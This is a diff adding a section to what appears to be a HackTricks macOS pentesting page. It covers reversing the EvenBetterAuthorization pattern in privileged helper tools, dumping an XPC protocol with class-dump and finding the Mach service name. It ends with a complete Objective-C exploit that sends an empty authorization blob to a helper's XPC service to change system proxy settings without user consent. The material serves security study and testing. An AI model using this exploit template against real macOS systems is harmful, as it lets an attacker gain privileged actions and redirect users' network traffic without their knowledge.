@@ -296,6 +296,156 @@ Rights with 'session-owner': 'true':
 authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
 ```
 
+## Reversing Authorization
+
+### Checking if EvenBetterAuthorization is used
+
+If you find the function: **`[HelperTool checkAuthorization:command:]`** it's probably the the process is using the previously mentioned schema for authorization:
+
+<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Thisn, if this function is calling functions such as `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, it's using [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).
+
+Check the **`/var/db/auth.db`** to see if it's possible to get permissions to call some privileged action without user interaction.
+
+### Protocol Communication
+
+Then, you need to find the protocol schema in order to be able to establish a communication with the XPC service.
+
+The function **`shouldAcceptNewConnection`** indicates the protocol being exported:
+
+<figure><img src="../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+In this case, we have the same as in EvenBetterAuthorizationSample, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).
+
+Knowing, the name of the used protocol, it's possible to **dump its header definition** with:
+
+```
+class-dump /Library/PrivilegedHelperTools/com.example.HelperTool
+
+[...]
+@protocol HelperToolProtocol
+- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
+- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
+- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
+- (void)getVersionWithReply:(void (^)(NSString *))arg1;
+- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
+@end
+[...]
+```
+
+Lastly, we just need to know the **name of the exposed Mach Service** in order to stablish a communication with it. There are several ways to find this:
+
+* In the **`[HelperTool init]`** where you can see the Mach Service being used:
+
+<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+* In the launchd plist:
+
+```
+cat /Library/LaunchDaemons/com.example.HelperTool.plist
+
+[...]
+
+	<key>MachServices</key>
+	<dict>
+		<key>com.example.HelperTool</key>
+		<true/>
+	</dict>
+[...]
+```
+
+### Exploit Example
+
+In this example is created:
+
+* The definition of the protocol with the functions
+* An empty auth to use to to ask for access
+* A connection to the XPC service
+* A call to the function if the connection was successfull
+
+```
+// gcc -framework Foundation -framework Security expl.m -o expl
+
+#import <Foundation/Foundation.h>
+#import <Security/Security.h>
+
+// Define a unique service name for the XPC helper
+static NSString* XPCServiceName = @"com.example.XPCHelper";
+
+// Define the protocol for the helper tool
+@protocol XPCHelperProtocol
+- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
+- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
+- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
+- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
+- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
+@end
+
+int main(void) {
+    NSData *authData;
+    OSStatus status;
+    AuthorizationExternalForm authForm;
+    AuthorizationRef authReference = {0};
+    NSString *proxyAddress = @"127.0.0.1";
+    NSString *proxyPort = @"4444";
+    Boolean isProxyEnabled = true;
+     
+    // Create an empty authorization reference
+    status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
+    const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+    NSLog(@"OSStatus: %s", errorMsg);
+    
+    // Convert the authorization reference to an external form
+    if (status == errAuthorizationSuccess) {
+        status = AuthorizationMakeExternalForm(authReference, &authForm);
+        errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+        NSLog(@"OSStatus: %s", errorMsg);
+    }
+    
+    // Convert the external form to NSData for transmission
+    if (status == errAuthorizationSuccess) {
+        authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
+        errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
+        NSLog(@"OSStatus: %s", errorMsg);
+    }
+    
+    // Ensure the authorization was successful
+    assert(status == errAuthorizationSuccess);
+     
+    // Establish an XPC connection
+    NSString *serviceName = XPCServiceName;
+    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
+    NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
+    [xpcConnection setRemoteObjectInterface:xpcInterface];
+    [xpcConnection resume];
+
+    // Handle errors for the XPC connection
+    id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
+        NSLog(@"[-] Connection error");
+        NSLog(@"[-] Error: %@", error);
+    }];
+
+    // Log the remote proxy and connection objects
+    NSLog(@"Remote Proxy: %@", remoteProxy);
+    NSLog(@"XPC Connection: %@", xpcConnection);
+
+    // Use the legacy method to configure the proxy
+    [remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
+        NSLog(@"Response: %@", error);
+    }];
+         
+    // Allow some time for the operation to complete
+    [NSThread sleepForTimeInterval:10.0f];
+    
+    NSLog(@"Finished!");
+}
+```
+
+## References
+
+* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)
+
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
